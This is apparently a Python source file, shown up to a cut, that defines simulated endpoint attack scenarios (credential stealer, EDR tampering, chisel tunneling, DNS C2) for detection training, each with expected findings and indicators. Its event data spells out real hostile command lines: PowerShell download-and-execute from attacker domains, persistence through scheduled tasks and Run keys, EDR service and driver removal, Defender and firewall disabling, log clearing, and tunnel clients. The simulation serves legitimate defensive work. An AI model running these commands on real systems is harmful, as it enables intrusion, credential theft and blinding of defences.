        AttackEvent(event_type="process_event", delay=_delay(0, 0), data={"process_name": "powershell.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 5100, "integrity_level": "medium", "command_line": "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri 'https://cdn-static-assets.com/update.exe' -OutFile 'C:\\ProgramData\\Microsoft\\Windows\\caches\\svchost.exe'\"", "hash": "f28531ceffd92829980a86272ae5fd0c5dadd3bcc82f1fea51075b26cb9ac84b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "delivery"}}, requires_success=False),
        # Phase 2: Persistence — scheduled task and registry run key
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "schtasks.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\System32\\schtasks.exe", "pid": 5160, "integrity_level": "medium", "command_line": "schtasks.exe /create /tn MicrosoftEdgeUpdateTaskMachineCore /tr C:\\ProgramData\\Microsoft\\Windows\\caches\\svchost.exe /sc onlogon /ru SYSTEM /f", "hash": "628aac25ff0176d19621912bd4f8fbca9b7e364a814429448f8c08b83b0b03ce", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"process_name": "reg.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\System32\\reg.exe", "pid": 5192, "integrity_level": "medium", "command_line": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSecurityHelper /t REG_SZ /d C:\\ProgramData\\Microsoft\\Windows\\caches\\svchost.exe /f", "hash": "04b07914398d4a57893ed92b35ce2c39763de91697ceefbb55a04aae20902837", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence"}}, requires_success=True),
        # Phase 3: Discovery — host reconnaissance
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "whoami.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 5224, "integrity_level": "medium", "command_line": "whoami /all", "hash": "cab64c2ac2c61bdf49d8a884ef7660e63358c021795c10cac7e38c5f6dc8a0c4", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "net.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 5256, "integrity_level": "medium", "command_line": "net group \"Domain Admins\" /domain", "hash": "8061add7bb3fda48adb112b1262fa4d030da562aae3a3f9d30c13c362445beb6", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Phase 4: Credential harvesting — browser saved passwords
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "system": "local", "label": "personal", "category": "credentials", "description": "Payload read Chrome saved passwords database", "metadata": {"attack_phase": "credential_access", "browser": "chrome"}}, requires_success=True),
        # Phase 5: First scheduled task execution — payload re-runs after simulated reboot
        AttackEvent(event_type="process_event", delay=_delay(30, 20, 5, 120), data={"process_name": "taskeng.exe", "action": "start", "parent_process": "svchost.exe", "path": "C:\\Windows\\System32\\taskeng.exe", "pid": 5320, "integrity_level": "system", "command_line": "C:\\ProgramData\\Microsoft\\Windows\\caches\\svchost.exe", "hash": "09ae0da744effad6853f283686ff891cdb4b77fd09ce09a404a87f5dbc4589f2", "user_context": "NT AUTHORITY\\SYSTEM", "metadata": {"attack_phase": "execution", "scheduled_task_execution": True}}, requires_success=True),
        # Phase 6: C2 callback after task re-execution
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 256, "bytes_received": 1024, "description": "C2 callback after task re-executed payload", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True}}, requires_success=True),
        # Phase 7: Second scheduled task execution — demonstrates persistence
        AttackEvent(event_type="process_event", delay=_delay(60, 30, 15, 180), data={"process_name": "taskeng.exe", "action": "start", "parent_process": "svchost.exe", "path": "C:\\Windows\\System32\\taskeng.exe", "pid": 5388, "integrity_level": "system", "command_line": "C:\\ProgramData\\Microsoft\\Windows\\caches\\svchost.exe", "hash": "09ae0da744effad6853f283686ff891cdb4b77fd09ce09a404a87f5dbc4589f2", "user_context": "NT AUTHORITY\\SYSTEM", "metadata": {"attack_phase": "execution", "scheduled_task_execution": True, "second_execution": True}}, requires_success=True),
        # Phase 8: File collection and staging
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "svchost.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 5440, "integrity_level": "system", "command_line": "PowerShell.exe -c \"Compress-Archive -Path 'C:\\Users\\{victim_username}\\Documents\\*.xlsx','C:\\Users\\{victim_username}\\Documents\\*.docx' -DestinationPath 'C:\\Windows\\Temp\\diag-report.zip'\"", "hash": "49d8f5ee9a1e21acf6d4d401c00ed62af227445e406c26130c8ca085d30188d0", "user_context": "NT AUTHORITY\\SYSTEM", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        # Phase 9: Exfiltration
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 5242880, "bytes_received": 1024, "description": "Staged archive exfiltrated over C2 channel (5 MB)", "metadata": {"attack_phase": "exfiltration", "c2_exfil": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.75,
    iocs=["cdn-static-assets.com"],
    expected_findings=["Payload delivery via PowerShell download", "schtasks.exe by non-system process", "Registry Run key added", "C2 callback"],
    relevant_ioc_keys=["attacker_ip", "c2_domain"],
)

CREDENTIAL_STEALER = AttackScenario(
    id="credential_stealer",
    tier="T2",
    name="Browser and Windows Credential Store Stealer",
    description="Infostealer malware executes from a temp directory, fingerprints the host, harvests saved credentials from multiple browsers (Chrome, Edge, Firefox), dumps DPAPI-protected secrets and Windows Credential Manager, compresses the loot into an encrypted archive, and exfiltrates to C2. Attacker later reuses stolen credentials to log in from a foreign IP.",
    attack_type="malware",
    events=[
        # --- Phase 1: Execution — stealer launches from temp directory ---
        AttackEvent(event_type="process_event", delay=_delay(0, 0), data={"process_name": "systeminfo_helper.exe", "action": "start", "parent_process": "explorer.exe", "command_line": "C:\\Users\\{victim_username}\\AppData\\Local\\Temp\\systeminfo_helper.exe --silent", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Temp\\systeminfo_helper.exe", "pid": 7840, "integrity_level": "medium", "hash": "f1e2d3c4b5a6978867564534231201fedcba987654321fedcba987654321fedc", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "stealer_binary": True}}, requires_success=False),

        # --- Phase 2: System fingerprinting ---
        AttackEvent(event_type="process_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"process_name": "cmd.exe", "action": "start", "parent_process": "systeminfo_helper.exe", "command_line": "cmd.exe /c whoami /all & systeminfo & ipconfig /all", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 7868, "integrity_level": "medium", "hash": "9172542ef1f7e78dcf0e22673cc7105d8e87addf79fdf33fbcfcc67e280ba16a", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "system_fingerprint": True}}, requires_success=True),

        # --- Phase 3: Browser credential harvesting ---
        # Chrome saved passwords
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "system": "local", "label": "personal", "category": "credentials", "description": "Stealer read Chrome saved passwords database", "metadata": {"attack_phase": "credential_access", "browser": "chrome"}}, requires_success=True),
        # Chrome cookies (session tokens)
        AttackEvent(event_type="file_event", delay=_delay(0.2, 0.1, 0.05, 0.5), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "system": "local", "label": "personal", "category": "credentials", "description": "Stealer read Chrome cookies database — session tokens harvested", "metadata": {"attack_phase": "credential_access", "browser": "chrome", "cookie_theft": True}}, requires_success=True),
        # Edge saved passwords
        AttackEvent(event_type="file_event", delay=_delay(0.2, 0.1, 0.05, 0.5), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data", "system": "local", "label": "personal", "category": "credentials", "description": "Stealer read Edge saved passwords database", "metadata": {"attack_phase": "credential_access", "browser": "edge"}}, requires_success=True),
        # Firefox credential store
        AttackEvent(event_type="file_event", delay=_delay(0.2, 0.1, 0.05, 0.5), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\default\\logins.json", "system": "local", "label": "personal", "category": "credentials", "description": "Stealer read Firefox logins.json credential store", "metadata": {"attack_phase": "credential_access", "browser": "firefox"}}, requires_success=True),

        # --- Phase 4: Windows credential dump ---
        # DPAPI master key + credential blobs
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"process_name": "systeminfo_helper.exe", "action": "start", "parent_process": "systeminfo_helper.exe", "command_line": "systeminfo_helper.exe --dpapi-dump", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Temp\\systeminfo_helper.exe", "pid": 7904, "integrity_level": "medium", "hash": "f1e2d3c4b5a6978867564534231201fedcba987654321fedcba987654321fedc", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "dpapi_dump": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Microsoft\\Credentials\\", "system": "local", "label": "personal", "category": "credentials", "description": "Stealer read Windows Credential Manager vault files", "metadata": {"attack_phase": "credential_access", "windows_cred_manager": True}}, requires_success=True),

        # --- Phase 5: Staging — compress stolen data ---
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "systeminfo_helper.exe", "action": "start", "parent_process": "systeminfo_helper.exe", "command_line": "systeminfo_helper.exe --pack --output C:\\Users\\{victim_username}\\AppData\\Local\\Temp\\sysdiag.dat", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Temp\\systeminfo_helper.exe", "pid": 7936, "integrity_level": "medium", "hash": "f1e2d3c4b5a6978867564534231201fedcba987654321fedcba987654321fedc", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "collection", "staging": True}}, requires_success=True),

        # --- Phase 6: Exfiltration — send loot to C2 ---
        AttackEvent(event_type="network_event", delay=_delay(2, 1, 0.5, 5), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 256000, "bytes_received": 512, "description": "HTTPS POST to C2 — 250 KB encrypted credential archive exfiltrated"}, requires_success=True),

        # --- Phase 7: Attacker reuses stolen credentials (~1-2h later) ---
        AttackEvent(event_type="login", delay=_delay(75, 30, 20, 180), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "stolen_credential_reuse": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.6,
    iocs=["cdn-static-assets.com"],
    expected_findings=[
        "Unknown executable launched from user Temp directory",
        "Browser credential databases read across Chrome, Edge, and Firefox",
        "Stolen data compressed and exfiltrated to external C2 IP",
        "Login from foreign IP using stolen credentials ~1-2 hours after stealer execution",
    ],
    relevant_ioc_keys=["attacker_ip", "c2_domain"],
)

EDR_SECURITY_TAMPERING = AttackScenario(
    id="edr_security_tampering",
    tier="T2",
    name="EDR/Security Tooling Disabling and Tampering",
    description="Attacker gains initial access via PowerShell download, enumerates installed security tools, systematically disables EDR service, unloads kernel driver, disables Windows Defender and Firewall, clears security event logs, deploys payload with no EDR coverage, performs host enumeration, harvests credentials, establishes persistence via scheduled task, and maintains C2 communication.",
    attack_type="malware",
    events=[
        # --- Phase 1: Initial access — PowerShell download and execute ---
        AttackEvent(event_type="process_event", delay=_delay(0, 0), data={"process_name": "powershell.exe", "action": "start", "parent_process": "explorer.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 4100, "integrity_level": "high", "command_line": "powershell.exe -nop -w hidden -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://{c2_domain}/stage1.ps1')\"", "hash": "1402db1a56b4f8ad8d5f6f56c50a78609944d74f874712222d97c3a56258b776", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Enumerate installed security tools ---
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"process_name": "powershell.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 4160, "integrity_level": "high", "command_line": "powershell.exe -c \"Get-Service | Where-Object {$_.DisplayName -match 'Falcon|Defender|Symantec|Carbon|Sentinel'} | Select-Object Name, Status\"", "hash": "1402db1a56b4f8ad8d5f6f56c50a78609944d74f874712222d97c3a56258b776", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Stop EDR service ---
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"process_name": "sc.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\sc.exe", "pid": 4200, "integrity_level": "high", "command_line": "sc.exe stop CSFalconService", "hash": "360e943f104e3dfbde4ea4c07c7a3621f193b0194725b2f15ce8b1dfd42e7793", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Unload kernel driver ---
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"process_name": "fltMC.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\fltMC.exe", "pid": 4240, "integrity_level": "high", "command_line": "fltMC.exe unload csagent.sys", "hash": "95f1d4e198ec2cd923c3f5b1616ffec160d4c9397d4e7fdddf1b3a2aff5be507", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "driver_unload": True}}, requires_success=True),

        # --- Phase 5: Disable Windows Defender via registry ---
        AttackEvent(event_type="process_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"process_name": "reg.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\reg.exe", "pid": 4280, "integrity_level": "high", "command_line": "reg.exe add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f", "hash": "3bcac778a9e1c2074dd8bfc2c929a4a2bb54fa741786168ac25c7b3d93ebfd1d", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: Disable Windows Firewall ---
        AttackEvent(event_type="process_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"process_name": "netsh.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\netsh.exe", "pid": 4320, "integrity_level": "high", "command_line": "netsh advfirewall set allprofiles state off", "hash": "710614e023f495ab0d4d5fc44ee59ef43e2e607947bc863b158cfcb6d23321fa", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: Clear security event logs ---
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"process_name": "wevtutil.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\wevtutil.exe", "pid": 4360, "integrity_level": "high", "command_line": "wevtutil.exe cl Security", "hash": "be67e65b9cd639ed09eed2c57dadc0c85fa40f69687e7d38a82ea83361bc32bf", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "log_clearing": True}}, requires_success=True),

        # --- Phase 8: Deploy payload with no EDR coverage ---
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "final_payload.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\Temp\\final_payload.exe", "pid": 4400, "integrity_level": "high", "command_line": "C:\\Windows\\Temp\\final_payload.exe", "hash": "5e91f1c5f32c7f3098928ab1646651b0b95a84a67a8ec189cb127eb2952b5613", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "is_attacker": True, "edr_blinded": True}}, requires_success=True),

        # --- Phase 9: Host enumeration ---
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "whoami.exe", "action": "start", "parent_process": "final_payload.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 4440, "integrity_level": "high", "command_line": "whoami /all", "hash": "dc4ff989cddbfb6ded7f314231eef96b1b59810852e68cb4486baf217a7f3f8a", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 10: Credential harvesting ---
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "system": "local", "label": "personal", "category": "credentials", "description": "Read Chrome saved passwords — no EDR alert generated", "metadata": {"attack_phase": "credential_access", "is_attacker": True, "edr_blinded": True}}, requires_success=True),

        # --- Phase 11: Persistence via scheduled task ---
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "schtasks.exe", "action": "start", "parent_process": "final_payload.exe", "path": "C:\\Windows\\System32\\schtasks.exe", "pid": 4520, "integrity_level": "high", "command_line": "schtasks.exe /create /tn \"WindowsDefenderUpdate\" /tr \"C:\\Windows\\Temp\\final_payload.exe\" /sc onlogon /ru SYSTEM", "hash": "213dd01f19b3af0d9c21a87b55e9c029b03a4f3225d675002638b98d4a073664", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),

        # --- Phase 12: C2 communication ---
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 512, "bytes_received": 4096, "description": "C2 connection post-EDR-tamper — no endpoint alerts generated", "metadata": {"attack_phase": "command_and_control", "is_attacker": True, "c2_beacon": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.45,
    iocs=["cdn-static-assets.com"],
    expected_findings=["EDR service stopped (CSFalconService)", "Windows Defender disabled via registry", "Security event log cleared", "Payload launched with no EDR coverage", "C2 beacon with no endpoint detection"],
    relevant_ioc_keys=["attacker_ip", "c2_domain"],
)

PROTOCOL_TUNNELING_C2 = AttackScenario(
    id="protocol_tunneling_c2",
    tier="T2",
    name="Protocol Tunneling for Covert C2 Channel",
    description="Encrypted reverse tunnel (chisel) over HTTPS blends C2 with legitimate web traffic. Attacker maintains persistent tunnel with keep-alive beacons, performs host discovery, harvests credentials, collects files from multiple locations, stages data, and exfiltrates through the tunnel.",
    attack_type="malware",
    events=[
        # Phase 1: Tunnel establishment — chisel client connects
        AttackEvent(event_type="process_event", delay=_delay(0, 0), data={"process_name": "chisel.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\Temp\\chisel.exe", "pid": 6100, "integrity_level": "medium", "command_line": "chisel.exe client https://chisel-relay.cloud-infra.net:443 R:socks", "hash": "acee6c66452d213718e6a252ac8da3138c7a8c9d44647f2f636ef240452b125e", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "command_and_control"}}, requires_success=False),
        # Phase 2: Initial tunnel connection
        AttackEvent(event_type="network_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 1024, "bytes_received": 2048, "description": "HTTPS tunnel established (long-lived session)", "metadata": {"attack_phase": "command_and_control", "tunnel_connection": True}}, requires_success=True),
        # Phase 3: Keep-alive beacons (multiple to show pattern)
        AttackEvent(event_type="network_event", delay=_delay(5, 2, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 128, "bytes_received": 256, "description": "Periodic tunnel keep-alive beacon #1", "metadata": {"attack_phase": "command_and_control", "beaconing": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(5, 2, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 128, "bytes_received": 256, "description": "Periodic tunnel keep-alive beacon #2", "metadata": {"attack_phase": "command_and_control", "beaconing": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(5, 2, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 128, "bytes_received": 256, "description": "Periodic tunnel keep-alive beacon #3", "metadata": {"attack_phase": "command_and_control", "beaconing": True}}, requires_success=True),
        # Phase 4: Discovery — host reconnaissance via tunnel
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "whoami.exe", "action": "start", "parent_process": "chisel.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 6180, "integrity_level": "medium", "command_line": "whoami /all", "hash": "9885ad2ea839dee57c1cc14390ccb015bbf42230efca438c9ed36495901a9c51", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "via_tunnel": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "cmd.exe", "action": "start", "parent_process": "chisel.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 6220, "integrity_level": "medium", "command_line": "cmd.exe /c dir /s /b C:\\Users", "hash": "6f0c30a0cc65e712643c9be76bd49afbcaf83b7602ca1eccf774bbf229a908ab", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "via_tunnel": True}}, requires_success=True),
        # Phase 5: Credential access — dump stored credentials
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "system": "local", "label": "personal", "category": "credentials", "description": "Attacker read Chrome saved passwords via tunnel session", "metadata": {"attack_phase": "credential_access", "browser": "chrome", "via_tunnel": True}}, requires_success=True),
        # Phase 6: File collection from multiple locations
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "read", "path": "C:\\Users\\{victim_username}\\Documents\\", "system": "local", "description": "Enumerated Documents folder for sensitive files via tunnel", "metadata": {"attack_phase": "collection", "via_tunnel": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "read", "path": "C:\\Users\\{victim_username}\\Desktop\\", "system": "local", "description": "Enumerated Desktop folder for sensitive files via tunnel", "metadata": {"attack_phase": "collection", "via_tunnel": True}}, requires_success=True),
        # Phase 7: Data staging — archive collected files
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 20), data={"action": "copy", "path": "C:\\Windows\\Temp\\staging\\data_archive.zip", "system": "endpoint", "description": "Data staged for exfil via tunnel", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        # Phase 8: Exfiltration through tunnel
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 12582912, "bytes_received": 1024, "description": "Staged archive exfiltrated through HTTPS tunnel (12 MB)", "metadata": {"attack_phase": "exfiltration", "tunnel_exfil": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.6,
    iocs=["chisel-relay.cloud-infra.net"],
    expected_findings=["Tunnel client from Temp directory", "Long-lived HTTPS session with low-jitter beaconing", "Discovery commands as child of tunnel process", "Data exfiltrated through HTTPS tunnel"],
    relevant_ioc_keys=["attacker_ip", "c2_domain"],
)

DNS_BASED_C2 = AttackScenario(
    id="dns_based_c2",
    tier="T3",
    name="DNS Tunneling for Covert C2 and Data Exfiltration",
    description="Attacker deploys a DNS tunneling implant via PowerShell download-and-execute, establishes persistent DNS beacon communication to an attacker-controlled domain, installs persistence via scheduled task, performs host enumeration, and then uses the covert DNS channel over multiple days to receive commands, harvest credentials from Chrome, enumerate files, and exfiltrate sensitive data in encoded DNS query batches — all while staying below volume thresholds. Implant self-deletes after completing exfiltration.",
    attack_type="malware",
    events=[
        # =====================================================================
        # DAY 1 — Implant deployment, DNS beacon, persistence, host enumeration
        # =====================================================================

        # --- Phase 1: Implant deployment via PowerShell download + execute ---
        AttackEvent(event_type="process_event", delay=_delay(0, 0), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 3840, "integrity_level": "high", "command_line": "PowerShell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri '{download_url}' -OutFile 'C:\\Windows\\Temp\\dnscat2.exe'\"", "hash": "c5d6e7f8a1b2c3d4e5f6a7b8901234567890abcdef1234567890abcdef123456", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "is_attacker": True}}, requires_success=False),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "dnscat2.exe", "action": "start", "parent_process": "PowerShell.exe", "path": "C:\\Windows\\Temp\\dnscat2.exe", "pid": 4012, "integrity_level": "high", "command_line": "dnscat2.exe -s {c2_domain} -t TXT --mode beacon", "hash": "f9e8d7c6b5a4321098765432fedcba9876543210fedcba9876543210fedcba98", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "command_and_control", "is_attacker": True}}, requires_success=True),

        # --- Phase 2: DNS beacon establishment ---
        AttackEvent(event_type="network_event", delay=_delay(1, 0.5, 0.1, 3), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 128, "bytes_received": 256, "description": "DNS TXT query to {c2_domain} — initial C2 beacon check-in", "metadata": {"attack_phase": "command_and_control", "dns_tunneling": True}}, requires_success=True),

        # --- Phase 3: Persistence via scheduled task ---
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "schtasks.exe", "action": "start", "parent_process": "dnscat2.exe", "path": "C:\\Windows\\System32\\schtasks.exe", "pid": 4180, "integrity_level": "high", "command_line": "schtasks /create /tn \"WindowsTelemetryAgent\" /tr \"C:\\Windows\\Temp\\dnscat2.exe -s {c2_domain} -t TXT --mode beacon\" /sc onstart /rl highest", "hash": "e5f6a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcd", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Host enumeration commands ---
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "whoami.exe", "action": "start", "parent_process": "dnscat2.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 4256, "integrity_level": "high", "command_line": "whoami /all", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "net.exe", "action": "start", "parent_process": "dnscat2.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 4320, "integrity_level": "high", "command_line": "net view /domain", "hash": "c3d4e5f6a7b8901234567890abcdef2345678901abcdef2345678901abcdef23", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: First DNS beacon batch (report recon results back) ---
